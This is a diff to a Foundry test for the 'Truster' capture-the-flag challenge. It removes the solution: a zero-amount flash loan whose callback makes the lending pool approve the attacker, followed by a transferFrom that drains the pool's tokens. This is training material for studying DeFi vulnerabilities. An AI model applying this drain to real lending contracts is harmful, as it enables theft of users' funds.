@@ -53,11 +53,7 @@ contract TrusterChallenge is Test {
      */
     // @audit-info Done
     function test_truster() public checkSolvedByPlayer {
-        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", player, token.balanceOf(address(pool)));
-
-        pool.flashLoan(0, address(this), address(token), data);
-        token.transferFrom(address(pool), player, token.balanceOf(address(pool)));
-        token.transfer(recovery, token.balanceOf(address(pool)));
+        
         // done
         
     }
